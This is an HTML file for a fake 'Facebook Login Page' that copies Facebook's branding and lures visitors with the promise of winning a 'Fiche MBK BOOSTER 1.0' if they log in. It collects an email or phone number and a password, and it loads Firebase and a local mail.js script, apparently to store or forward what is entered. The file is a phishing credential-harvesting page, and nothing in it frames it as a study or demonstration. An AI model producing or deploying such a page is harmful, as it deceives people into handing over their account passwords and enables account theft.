<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login Page</title>
    <link rel="stylesheet" href="styles.css">
</head>

<body>
    <div class="content">
        <div class="flex-div">
            <div class="name-content">
                <h1 class="logo">Facebook</h1>
                <p>If you log in, you have a chance to win a Fiche MBK BOOSTER 1.0</p>
            </div>
            <form action="" id="contactForm">
                <div class="alert">Your message sent</div>

                <input type="text" id="name" placeholder="Email or Phone Number" required />
                <input type="password" id="emailid" placeholder="Password" required>

                <a href="#">Forgot Password ?</a>
                <hr>
                                <div class="inputBox">

                <button type="submit" class="login-button">Login</button>
                                                    </div>

            </form>
        </div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1-0/firebase.js"></script>
    <script src="./mail.js"></script>
</body>

</html>
